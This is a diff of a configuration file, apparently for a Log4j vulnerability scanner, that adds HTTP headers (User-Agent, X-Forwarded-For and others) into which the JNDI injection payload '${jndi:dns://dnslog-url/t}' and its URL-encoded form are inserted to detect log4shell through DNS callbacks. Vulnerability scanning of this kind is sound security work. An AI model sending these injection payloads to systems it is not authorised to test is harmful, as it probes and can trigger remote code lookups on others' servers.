@@ -74,7 +74,7 @@ urlBlackListSuffix:
 
 # 黑名单参数
 # 请求出现这些字段的都不进行测试
-# 为空表示关闭该功能
+# 注: 为空表示关闭该功能
 blackListParameters:
   - "callback"
   - "referer"
@@ -98,6 +98,26 @@ application:
       provider: "RemoteCmdScan"
       # 漏洞名称
       issueName: "log4j-RemoteCmd"
+      # 表示进行漏洞扫描的header头
+      # 添加以后每个请求都会自动带上这些header进行漏洞扫描
+      # 添加这些header头,并不会产生额外的请求,放心添加
+      # 注: 为空表示关闭该功能
+      headers:
+        - "User-Agent"
+        - "X-Client-IP"
+        - "X-Remote-IP"
+        - "X-Remote-Addr"
+        - "X-Forwarded-For"
+        - "X-Originating-IP"
+        - "CF-Connecting_IP"
+        - "True-Client-IP"
+        - "X-Forwarded-For"
+        - "Originating-IP"
+        - "X-Real-IP"
+        - "X-Client-IP"
+        - "Client-IP"
+        - "X-Wap-Profile"
+        - "X-Api-Version"
       payloads:
         - "${jndi:dns://dnslog-url/t}"
         - "%24%7Bjndi%3Adns%3A%2F%2Fdnslog-url%2Ft%7D"
